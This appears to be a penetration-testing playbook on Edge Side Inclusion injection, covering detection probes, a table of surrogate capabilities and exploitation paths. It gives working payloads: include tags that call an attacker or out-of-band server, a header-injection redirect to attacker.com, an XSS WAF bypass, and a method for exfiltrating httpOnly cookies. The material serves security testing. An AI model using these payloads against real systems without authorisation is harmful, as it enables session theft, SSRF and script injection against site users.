# Edge Side Inclusion (ESI) Injection

## Table of Contents

- [Mental Model](#mental-model)
- [When to Test for ESI](#when-to-test-for-esi)
- [Detection Logic](#detection-logic)
- [Software Capability Matrix](#software-capability-matrix)
- [Exploitation Reasoning](#exploitation-reasoning)
- [Blind ESI Detection](#blind-esi-detection)
- [Reasoning Checkpoint](#reasoning-checkpoint)

---

## Mental Model

ESI operates at the **HTTP surrogate layer** — CDNs, caching proxies, reverse proxies — not at the web server or application layer. ESI tags in an HTTP response are processed by the surrogate (Varnish, Squid, Akamai, Fastly) *before* the response reaches the client. If an attacker can inject ESI markup into a response that passes through a surrogate, the surrogate will execute it.

**Why ESI matters alongside SSI:** ESI and SSI share the same injection surface (user input reflected in HTML) but execute in completely different infrastructure layers. A page where SSI is not active may still be vulnerable to ESI if its responses pass through a surrogate that processes ESI tags. This is why ESI assessment is a separate phase rather than a substep of SSI exploitation.

**Critical insight for decision-making:** ESI capabilities vary dramatically by surrogate software. Before attempting any exploitation, you MUST identify which surrogate is in play and consult the capability matrix below. Attempting cookie theft against Varnish (which doesn't support ESI variables or cookies) wastes requests and creates noise. Attempting external includes against Fastly (which enforces a host whitelist) will silently fail.

---

## When to Test for ESI

Enter ESI testing when ANY of these signals are present:

1. `Surrogate-Control: content="ESI/1.0"` header in any response
2. Known CDN/proxy identified via headers: `X-Varnish`, `X-Akamai-*`, `X-Cache`, `Via`, `Age`, `Fastly-*`
3. Application architecture suggests caching proxy infrastructure (high-traffic site, static page caching, geographic distribution hints)
4. SSI testing in Phases 1-3 was negative but infrastructure suggests server-side markup processing

**Do NOT test for ESI** if:
- Responses come directly from the origin server with no intermediary (no caching/proxy headers, no CDN)
- The target is a simple application server with no cache layer

---

## Detection Logic

### Step 1: Comment Stripping Test

The simplest ESI detection — exploits the fact that ESI surrogates strip `<!--esi ... -->` comment blocks during processing:

**Inject:** `ESICHECK<!--esi-->MARKER`

| Response | Interpretation | Confidence | Action |
|----------|----------------|------------|--------|
| `ESICHECKMARKER` (comment stripped, text concatenated) | ESI processing confirmed | HIGH | Proceed to exploitation |
| `ESICHECK<!--esi-->MARKER` (unchanged) | ESI not processing at this point | LOW | Try Step 2 |
| Request blocked | WAF may filter ESI tags | Try URL-encoded variant, then Step 2 |

**Why this works:** Even the most minimal ESI implementation strips `<!--esi-->` blocks. This probe is harmless, doesn't require external infrastructure, and produces an unambiguous signal — the string either concatenates or it doesn't.

### Step 2: Blind OOB Detection `[EXTERNAL INFRA REQUIRED]`

If comment stripping is inconclusive, use out-of-band detection:

**Inject:** `<esi:include src="http://YOUR_OOB_SERVER/esi-detect-TIMESTAMP" />`

If you receive an HTTP request at your OOB server → the surrogate is fetching the included URL → ESI processing confirmed.

**Why OOB over inline?** Many ESI implementations fetch includes server-side but don't render the result visibly in the response (especially if the included resource returns non-HTML content). OOB detection works regardless of rendering behavior.

**Source IP analysis:** When the callback arrives, check the source IP. If it's from the CDN/proxy IP range → ESI processing confirmed at the surrogate layer. If it's from the origin server IP → the application itself is fetching the URL (SSRF, not ESI). This distinction matters for exploitation path selection.

### Step 3: Debug Probe (Akamai-specific)

If Akamai is suspected based on response headers:

**Inject:** `<esi:debug />`

Akamai may return debug information about ESI processing configuration. This both confirms ESI and identifies the surrogate definitively.

### Detection Confidence Summary

| Evidence | Confidence |
|----------|------------|
| Comment stripped (concatenation test) | HIGH |
| OOB callback from surrogate IP range | HIGH |
| Debug output returned (Akamai) | HIGH |
| `Surrogate-Control` header present, but no probe succeeded | MEDIUM — ESI enabled but this injection point may not reach processed context |
| No surrogate signals, no probe response | LOW — ESI unlikely at this endpoint |

---

## Software Capability Matrix

**Consult this matrix BEFORE attempting exploitation.** It determines which attack paths are even possible for the identified surrogate.

| Surrogate | Includes | Variables | Cookies | Requires Upstream Header | Host Whitelist |
|-----------|----------|-----------|---------|--------------------------|----------------|
| Squid3 | Yes | Yes | Yes | Yes (`Surrogate-Control`) | No |
| Varnish Cache | Yes | No | No | Yes (`Surrogate-Control`) | Yes |
| Fastly | Yes | No | No | No | Yes |
| Akamai ETS | Yes | Yes | Yes | No | No |
| NodeJS esi | Yes | Yes | Yes | No | No |
| NodeJS nodesi | Yes | No | No | No | Optional |

### How to Read This Matrix

1. **Identify the surrogate** from response headers (`X-Varnish`, `X-Akamai-*`, `Via` header contents, `Server` header).
2. **Check Includes** — all surrogates support `<esi:include>`, but host whitelist and upstream header requirements constrain it.
3. **Check Variables/Cookies** — if the surrogate doesn't support these (Varnish, Fastly), cookie theft and variable-based attacks are impossible at the ESI layer. Do not waste requests attempting them.
4. **Check Host Whitelist** — Varnish and Fastly reject includes pointing to non-whitelisted hosts. Your attacker server won't be on the whitelist. Exploitation is limited to including hosts the surrogate already trusts (SSRF through the surrogate, or finding an open redirect on a whitelisted host).
5. **Check Upstream Header** — Squid and Varnish only process ESI if the origin response includes `Surrogate-Control: content="ESI/1.0"`. If the origin doesn't send this header, the surrogate ignores ESI tags entirely — no exploitation possible even if you can inject ESI markup.

---

## Exploitation Reasoning

Enter exploitation only after ESI processing is confirmed (HIGH confidence from detection).

### Path 1: Include-Based Exploitation

**When it works:** Surrogate supports includes AND either has no host whitelist (Squid3, Akamai, NodeJS esi) or your attacker server is on the whitelist.

**What you can accomplish:**
- **Content injection / XSS:** Include attacker-hosted HTML containing JavaScript `[EXTERNAL INFRA REQUIRED]`
- **SSRF through the surrogate:** Include internal URLs the surrogate can reach but the client cannot — the surrogate fetches the resource server-side. This works even with host whitelists if you target internal/whitelisted hosts.

**Decision logic:**
- Does the surrogate enforce a host whitelist?
  - **No whitelist** (Squid3, Akamai, NodeJS esi) → include your external server directly `[EXTERNAL INFRA REQUIRED]`
  - **Whitelist present** (Varnish, Fastly) → pivot to SSRF via internal includes, or find an open redirect on a whitelisted host to chain through `[EXTERNAL INFRA REQUIRED]`

### Path 2: Cookie Exfiltration

**When it works:** Surrogate supports variables AND cookies — Squid3, Akamai ETS, NodeJS esi only. This is particularly high-impact because it **bypasses httpOnly** — the surrogate reads cookies server-side before the response reaches the browser.

**How it works:** The surrogate resolves `$(HTTP_COOKIE)` in ESI tags before sending the response. By embedding it in an include URL pointing to your server, cookies are exfiltrated as part of the HTTP request path. `[EXTERNAL INFRA REQUIRED]`

**Decision:** Check the capability matrix first. If the surrogate is Varnish or Fastly → cookies are not supported at the ESI layer → skip this path entirely. Do not attempt it.

### Path 3: Header Manipulation

**When it works:** Some ESI implementations support `$add_header()` function or `<esi:request_header>` element.

**What you can accomplish:**
- **Open redirect:** Inject `Location` header via `$add_header('Location','http://attacker.com')` `[EXTERNAL INFRA REQUIRED]`
- **Content-Type manipulation:** Override content type to enable MIME confusion
- **CRLF injection:** If the include URL isn't properly sanitized by the surrogate, inject headers via `%0d%0a` in the URL — enables response splitting, header injection

### Path 4: XSLT → XXE Chain (Akamai-specific)

**When it works:** Only Akamai ETS with `dca="xslt"` attribute support.

**What it enables:** Include an XML document with a malicious XSLT stylesheet. If the Akamai XSLT processor handles XXE entities, this enables file read or SSRF through the XML parser. `[EXTERNAL INFRA REQUIRED]`

**Decision:** Only attempt this if Akamai is positively confirmed. The `dca` and `stylesheet` attributes are Akamai-specific extensions — other surrogates will ignore them completely.

### Path 5: WAF Bypass via ESI Comment Stripping

**When it works:** ESI comment stripping is confirmed (detection Step 1 succeeded) and a WAF is blocking XSS payloads in the same application.

**How it works:** ESI surrogates strip `<!--esi-->` blocks. By splitting an XSS payload across ESI comments (e.g., `<scr<!--esi-->ipt>alert(1)</scr<!--esi-->ipt>`), the WAF sees a broken tag it doesn't recognize as dangerous, but after ESI processing the surrogate reassembles it into a valid `<script>` tag.

**Why this is valuable even with limited ESI capabilities:** This technique works as long as ESI comment stripping is active. It doesn't require includes, variables, or cookies. Even Varnish and Fastly — which have the most restricted feature sets — strip ESI comments. If detection Step 1 confirmed comment stripping, this path is available regardless of other capabilities.

---

## Blind ESI Detection

If you cannot observe ESI processing effects in the response (e.g., responses are cached and you're seeing stale versions, or the application doesn't reflect the injection point visibly):

1. Inject `<esi:include src="http://YOUR_OOB_SERVER/esi-blind-UNIQUEID" />` `[EXTERNAL INFRA REQUIRED]`
2. Wait for callback — allow for cache TTL to expire if you suspect caching
3. When callback arrives, verify the source IP comes from the surrogate/CDN IP range, not the origin server
4. Surrogate IP confirms ESI processing at the cache layer; origin IP suggests SSRF (different vulnerability class, different exploitation path)

**Why source IP matters:** If the callback comes from the origin server's IP, the web application itself is fetching the URL — that's a potential SSRF finding, not ESI. If it comes from a CDN/cache IP range, the surrogate is processing ESI tags. The distinction determines whether you're exploiting cache-layer ESI or application-layer SSRF.

---

## Reasoning Checkpoint

```
[ESI-ASSESSMENT]
[SURROGATE] {identified software / "unknown" / "none detected"}
[DETECTION-METHOD] {comment stripping / OOB callback / debug / none succeeded}
[CONFIDENCE] {HIGH / MEDIUM / LOW}
[CAPABILITIES] {from matrix: includes, variables, cookies, whitelist status}
[EXPLOITATION-PATH] {path attempted and result}
[MAX-IMPACT] {XSS / Cookie theft / SSRF / Header manipulation / WAF bypass / None}
[DECISION] {Document finding / Escalate / STOP — ESI not present or not exploitable}
```
